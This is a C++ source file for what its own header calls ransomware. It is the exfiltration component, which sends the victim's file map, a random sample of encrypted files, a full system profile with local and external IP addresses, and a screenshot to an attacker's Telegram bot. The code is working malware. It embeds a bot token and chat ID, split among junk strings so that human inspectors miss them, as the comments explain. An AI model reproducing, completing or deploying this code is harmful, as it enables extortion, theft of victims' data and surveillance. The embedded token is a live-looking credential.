// Developed by Colton Silva 2025
// version 1.0
//
// Categorized as RANSOMWARE
//
// This is a sub-file for selecting limited random files that are encrypted,
// fetching machine's info, external and internal IP addresses, and file
// signature, and then sending them into a created bot in telegram

#include "screenshotter.hpp"
#include <iostream>
#include <filesystem>
#include <vector>
#include <algorithm>
#include <random>
#include <chrono>
#include <curl/curl.h>
#include <unistd.h>   // for gethostname(), geteuid()
#include <pwd.h>      // for getpwuid()
#include <map>
#include <fstream>

// Callback for cURL response
size_t writeToString(void *contents, size_t size, size_t nmemb, std::string *output) {
    size_t totalSize = size * nmemb;
    output->append((char *)contents, totalSize);
    return totalSize;
}


namespace fs = std::filesystem;
using namespace std;

// Obfuscated Telegram bot token, change it into your own token
// But how to put my token here?
//
// You need to slice your token into part and put them in
// const string part(num) where (num) is the part number.
// You may add junk(num) strings so it will be hard to detect by
// (HUMAN) inspector

const string junk1 = "238778346637578690283905992235";
const string part1 = "8022406930";
const string junk2 = "527289774364367543";
const string junk3 = "8252343554674345366786478";
const string part2 = ":AAH2xIXM";
const string junk4 = "SLd8xZxToPPc9_eThcXmPT";
const string part3 = "B34_WcjvmL";
const string junk5 = "LeIKa9IUCai7c2SkEelUx0";
const string part4 = "5uFPZSTo_7ZXBoJsk";

const string BOT_TOKEN = part1 + part2 + part3 + part4;
const string CHAT_ID = "6558072995"; // Your chat ID
const size_t MAX_SIZE = 50 * 1024 * 1024; // 50MB file limit, mandatory
const string MAP_FILE = "file_map.txt";  // Must be sent first

bool sendFileToTelegram(const string &filePath) {
    size_t fileSize = fs::file_size(filePath);
    if (fileSize > MAX_SIZE) {
        cerr << "\033[1;31m[SKIP]\033[0m >50MB: " << filePath << " (" << fileSize / (1024 * 1024) << " MB)\n";
        return false;
    }

    CURL *curl = curl_easy_init();
    if (!curl) return false;
    
    string response;  // To capture response silently, comment out for verbose output

    curl_mime *form = curl_mime_init(curl);
    curl_mimepart *field = nullptr;

    string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";

    field = curl_mime_addpart(form);
    curl_mime_name(field, "chat_id");
    curl_mime_data(field, CHAT_ID.c_str(), CURL_ZERO_TERMINATED);

    field = curl_mime_addpart(form);
    curl_mime_name(field, "document");
    curl_mime_filedata(field, filePath.c_str());

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
        // To disable verbose output, comment out the 3 lines below
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeToString);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);  // Disable verbose output

    CURLcode res = curl_easy_perform(curl);
    bool ok = (res == CURLE_OK);
    if (!ok) cerr << "\033[1;31m[FAIL]\033[0m Send failed: " << filePath << "\n";

    curl_mime_free(form);
    curl_easy_cleanup(curl);
    return ok;
}

void sendRandomEncryptedFiles(const string &directory, int maxFiles = 10) {
    // Step 1: Send the file map first
    fs::path mapPath = fs::path(directory) / MAP_FILE;
    if (fs::exists(mapPath)) {
        cout << "\033[1;32m[SEND]\033[0m Sending file_map.txt first...\n";
        sendFileToTelegram(mapPath.string());
    } else {
        cerr << "\033[1;31m[WARN]\033[0m file_map.txt not found!\n";
    }

    // Step 2: Read the file map to get original file paths
    map<string, string> fileMap;
    ifstream mapFile(MAP_FILE, ios::binary);
    if (mapFile) {
        string encFile, origFile;
        while (mapFile >> encFile >> std::quoted(origFile)) {
            fileMap[encFile] = origFile;
        }
        mapFile.close();
    }

    // Step 3: Collect "null*" encrypted files, excluding those that were originally hidden
    vector<fs::path> encryptedFiles;
    for (const auto &entry : fs::recursive_directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            string name = entry.path().filename().string();
            
            if (name.rfind("null", 0) == 0) {
                // Check if this encrypted file corresponds to a hidden original file
                auto it = fileMap.find(name);
                if (it != fileMap.end()) {
                    string originalPath = it->second;
                    
                    // Check if original file was hidden (starts with .)
                    fs::path origPath(originalPath);
                    string origFileName = origPath.filename().string();
                    if (!origFileName.empty() && origFileName[0] == '.') {
                        cout << "\033[1;31m[SKIP]\033[0m Skipping hidden file: " << originalPath << endl;
                        continue;
                    }
                    
                    // Check if original file was in a hidden directory
                    bool hasHiddenDir = false;
                    fs::path currentPath = origPath;
                    while (currentPath != currentPath.parent_path()) {
                        string dirName = currentPath.filename().string();
                        if (!dirName.empty() && dirName[0] == '.') {
                            hasHiddenDir = true;
                            break;
                        }
                        currentPath = currentPath.parent_path();
                    }
                    
                    if (hasHiddenDir) {
                        cout << "\033[1;31m[SKIP]\033[0m Skipping file in hidden directory: " << originalPath << endl;
                        continue;
                    }
                }
                
                encryptedFiles.push_back(entry.path());
            }
        }
    }

    if (encryptedFiles.empty()) {
        cout << "\033[1;33m[INFO]\033[0m No non-hidden encrypted files found.\n";
        return;
    }

    // Shuffle randomly
    auto rng = default_random_engine(chrono::system_clock::now().time_since_epoch().count());
    shuffle(encryptedFiles.begin(), encryptedFiles.end(), rng);

    // Step 4: Send up to `maxFiles` if under 50MB
    int sent = 0;
    for (const auto &file : encryptedFiles) {
        if (sendFileToTelegram(file.string())) {
            sent++;
            // Show original filename if available
            string encFileName = file.filename().string();
            auto it = fileMap.find(encFileName);
            if (it != fileMap.end()) {
                cout << "\033[1;32m[OK]\033[0m Sent: " << encFileName << " (was: " << it->second << ")" << endl;
            } else {
                cout << "\033[1;32m[OK]\033[0m Sent: " << encFileName << endl;
            }
            if (sent >= maxFiles) break;
        }
    }

    cout << "\033[1;32m[DONE]\033[0m Sent " << sent << " file(s).\n";
}

// This part is for sending machine and IP addresses to telegram bot

// Fetch command output
string getCommandOutput(const string &cmd) {
    string data;
    FILE *stream;
    const int max_buffer = 512;
    char buffer[max_buffer];
    stream = popen(cmd.c_str(), "r");
    if (stream) {
        while (fgets(buffer, max_buffer, stream) != NULL) {
            data.append(buffer);
        }
        pclose(stream);
    }
    return data;
}



// Fetch public IP via HTTP
string getPublicIP() {
    CURL *curl = curl_easy_init();
    string response;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeToString);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    return response.empty() ? "Unavailable" : response;
}

string gatherFullSystemInfo() {
    stringstream info;

    // Hostname
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    info << "🖥 Hostname: " << hostname << "\n";

    // Username
    struct passwd *pw = getpwuid(geteuid());
    info << "👤 User: " << (pw ? pw->pw_name : "unknown") << "\n";

    // OS
    info << "📦 OS: " << getCommandOutput("uname -o");
    info << "🧱 Kernel: " << getCommandOutput("uname -r");

    // Architecture
    info << "🔧 Arch: " << getCommandOutput("uname -m");

    // CPU
    info << "🧠 CPU: " << getCommandOutput("lscpu | grep 'Model name' | awk -F: '{print $2}'");

    // RAM
    info << "💾 RAM: " << getCommandOutput("free -h | grep Mem:");

    // Disk
    info << "💽 Disk: " << getCommandOutput("df -h --total | grep total");

    // Battery (optional)
    string battery = getCommandOutput("acpi -b 2>/dev/null");
    if (!battery.empty())
        info << "🔋 Battery: " << battery;

    // Uptime
    info << "⏱ Uptime: " << getCommandOutput("uptime -p");

    // IPs
    info << "📡 Local IP: " << getCommandOutput("hostname -I");
    info << "🌍 External IP: " << getPublicIP() << "\n";

    // Model info (if DMI available)
    string model = getCommandOutput("cat /sys/devices/virtual/dmi/id/product_name 2>/dev/null");
    string vendor = getCommandOutput("cat /sys/devices/virtual/dmi/id/sys_vendor 2>/dev/null");
    if (!vendor.empty() || !model.empty())
        info << "🧰 Hardware: " << vendor << model;

    // Timestamp
    time_t now = time(0);
    info << "🕒 Time: " << ctime(&now);

    return info.str();
}


void sendMessageToTelegram(const string &message) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
    string response;  // To capture response silently, comment out for verbose output

    char *escapedMsg = curl_easy_escape(curl, message.c_str(), message.length());
    if (!escapedMsg) {
        curl_easy_cleanup(curl);
        return;
    }

    string postFields = "chat_id=" + CHAT_ID + "&text=" + escapedMsg;

    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 20L);
    // To disable verbose output, comment out the 3 lines below
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeToString);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);  // Disable verbose output

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK)
        cerr << "\033[1;31m[FAIL]\033[0m sendMessage: " << curl_easy_strerror(res) << "\n";

    curl_free(escapedMsg);
    curl_easy_cleanup(curl);
}

// Function to send screenshot to Telegram
void sendScreenshotToTelegram() {
    string screenshotPath = "/tmp/screenshot.png";
    // Take screenshot first!
    if (!takeScreenshot(screenshotPath)) {
        cerr << "\033[1;31m[ERROR]\033[0m Failed to take screenshot." << endl;
        return;
    }
    if (fs::exists(screenshotPath)) {
        cout << "\033[1;33m[PROCESS]\033[0m Sending screenshot to Telegram..." << endl;
        if (sendFileToTelegram(screenshotPath)) {
            cout << "\033[1;32m[OK]\033[0m Screenshot sent to Telegram." << endl;
        } else {
            cerr << "\033[1;31m[ERROR]\033[0m Failed to send screenshot to Telegram." << endl;
        }
    } else {
        cerr << "\033[1;31m[ERROR]\033[0m Screenshot file not found: " << screenshotPath << endl;
    }
}
